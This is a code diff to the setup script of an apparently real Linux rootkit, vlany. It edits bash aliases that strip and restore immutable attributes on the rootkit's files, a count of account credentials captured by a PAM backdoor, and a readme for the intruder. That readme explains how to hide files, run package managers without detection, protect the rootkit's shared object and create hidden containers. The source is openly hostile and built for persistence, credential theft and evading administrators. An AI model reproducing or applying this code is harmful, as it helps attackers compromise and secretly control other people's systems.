@@ -424,7 +424,7 @@ alias pacman=apt-get
 alias unchattr='cd {0}; chattr -ia * &>/dev/null; echo "chattr permissions removed on rootkit files"'
 alias rechattr='cd {0}; chattr +ia * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
 
-echo -e "\\033[1mLogged login attempts: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
+echo -e "\\033[1mLogged account credentials: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
 [ ! -z "`which shred`" ] && alias vshred='shred -n 5 --random-source=/dev/urandom -uvz'
 echo "Use 'alias' to view list of all bash aliases."
 
@@ -447,37 +447,27 @@ echo "Use 'alias' to view list of all bash aliases."
   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝
       /(a rootkit for homosexuals)\\
 
-If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell. Now that you've started reading this, there's a few things you should know.
-vlany is now a public rootkit! Thanks for using me, it means a lot. Enjoy, and try not to get caught. :p
-By default, vlany attempts to prevent you from unhiding yourself to a certain extent, but you can easily get past that, since you ARE in an owner shell after all. Be careful if you're going to do something potentially dumb.
+If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell.
 DO NOT unalias apt-get and attempt to install a package via the standard package manager on this box. EVERYTHING WILL GO TO RUIN.
-There's a vlany command for installing packages via apt-get. To use it, enter "./apt" followed by your execve password.
-(The switch from GID based file hiding to extended attributes fixed this, but package managers still will not work. Nothing will be ruined, but package managers will not work.)
-That brings me on to my next point. You should've set a password for the execve commands when you installed vlany. To access them, run "./help" followed by the password you set. Voilà.
+There's a directory named 'scripts' with python scripts designed to assume the status of a normal process and execute something normally until the desired process is finished.
+Be careful if you're going to do something potentially dumb.
+(The switch from GID based file hiding to extended attributes fixed this, but package managers still will not work. Nothing will be ruined, but package managers will not work, and file modifications are apparent.)
 
-BIG GAY WARNING:
-    WHEN RUNNING THE APT-GET PROCESS, THE PROCESS WILL BE _UNHIDDEN_. MAKING ANY USER ABLE TO VIEW THE PROCESS FROM PS.
-    FOR THIS REASON, IT IS ONLY POSSIBLE TO INSTALL ONE PACKAGE AT A TIME. TRY NOT TO INSTALL PACKAGES THAT WILL TAKE MORE THAN 1 MINUTE TO INSTALL.
-    BE CAREFUL.
-    YOU HAVE BEEN WARNED.
-    THIS APPLIES FOR ANY PROCESSES WHICH TEMPORARILY CHANGE YOUR GID.
-
-A breakdown of how the command works:
-    cd to root
-    set gid root
-    use apt-get without FUCKING everything up
-    set gid back to original gid & rehide
-    cd back to previous directory
-Using this, you can also create your own scripts to do the same thing for other package managers such as emerge or yum.
-
-Rootkit shared object file:
-    This is located in your hidden directory. DO NOT remove it. If you do, ld will throw a shit bunch of errors your way. That's bad.
-    By default, install.sh makes the shared object file unremovable. If you run 'unchattr', you'll be able to remove it.
-
-File hiding/protection:
+**FILE HIDING/PROTECTION**:
     FILES OR DIRECTORIES CREATED IN THIS SHELL AREN'T HIDDEN DYNAMICALLY DUE TO THE NEW FILE HIDING BY EXTENDED ATTRIBUTES.
     ONCE YOU CREATE NEW FILES OR DIRECTORIES, YOU MUST ISSUE THE ./hide COMMAND ON THE NEWLY CREATED FILES/DIRECTORIES TO
     PROTECT THEM FROM REGULAR USERS. THIS IS VERY IMPORTANT. DO NOT FORGET THIS.
+    p.s.: you can also use ./unhide to... ya, unhide files & directories. also, your home directory is already hidden... so
+          just do everything in here.
+
+Python unhiding scripts:
+    So they're quite simple, around 30 lines, very easily copyable and configurable to do whatever it is you want.
+    By default, there's 3 scripts for using package managers normally (apt.py, pacman.py & yum.py), and vlany.py, which just helps in terms of efficacy.
+    But let me make it clear... Whatever you execute using these scripts is completely visible to userland - everyone can see it. Suspicions may be arisen.
+
+Rootkit shared object file:
+    This is located in your hidden directory. DO NOT remove it. If you do, ld will throw a shit bunch of errors everyone's way. That's bad.
+    By default, install.sh makes the shared object file unremovable. If you run 'unchattr', you'll be able to remove it.
 
 vlany LXC container:
   There's a file called enter_lxc.c in your home directory. It allows for on-the-fly creation and destruction of hidden container environments.
@@ -494,13 +484,14 @@ vlany LXC container:
   If somebody (not you) is monitoring disk usage of this box, they will notice that the disk usage will increase when you're in a container. The disk usage will go back to normal once you
   exit the container. It's not like this will get us caught, but it might look a little strange to some paranoid admins.
 
-Read this AT LEAST twice, when you're done, quit this screen by pressing q. This screen will not show again after this."""
+pce,
+press q to quit, this will not show again after this"""
 
     fd = open("bd_readme", "w")
     fd.write(BD_README)
     fd.close()
 
-# might tidy this up in a bit, like i done with install.sh
+# hm
 def main():
     const_h_setup()
     bash_rc_setup()
